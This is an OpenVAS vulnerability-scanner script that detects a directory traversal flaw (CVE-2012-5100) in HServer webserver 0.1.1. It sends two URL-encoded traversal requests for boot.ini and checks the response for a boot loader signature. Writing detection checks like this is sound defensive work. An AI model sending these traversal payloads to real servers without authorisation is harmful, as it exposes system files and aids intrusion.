###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hserver_webserver_mult_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# HServer Multiple Webserver Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "HServer webserver version 0.1.1";
tag_insight = "The flaws are due to improper validation of URI containing '..\..\'
  sequences, which allows attackers to read arbitrary files via directory
  traversal attacks.";
tag_solution = "No solution or patch is available as of 06th, January 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.luizpicanco.com/index.php?s=hserver";
tag_summary = "The host is running HServer Webserver and is prone to multiple
  directory traversal vulnerabilities.";

if(description)
{
  script_id(802410);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-5100");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-06 13:10:29 +0530 (Fri, 06 Jan 2012)");
  script_name("HServer Webserver Multiple Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521119");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108376/hserverwebserver-traversal.txt");

  script_description(desc);
  script_summary("Determine if HServer webserver is vulnerable to Directory Traversal Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8081);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8081);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Send and Receive the response
req = http_get(item: "/", port:port);
res = http_send_recv(port:port, data:req);

## Construct attack request
exploits  = make_list("/..%5c..%5c..%5cboot.ini",
                      "/%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini");

## Check for each exploit
foreach url (exploits)
{
   ## Try exploit and check the response to confirm vulnerability
   if(http_vuln_check(port:port, url:url, pattern:"\[boot loader\]"))
   {
     security_warning(port:port);
     exit(0);
   }
}
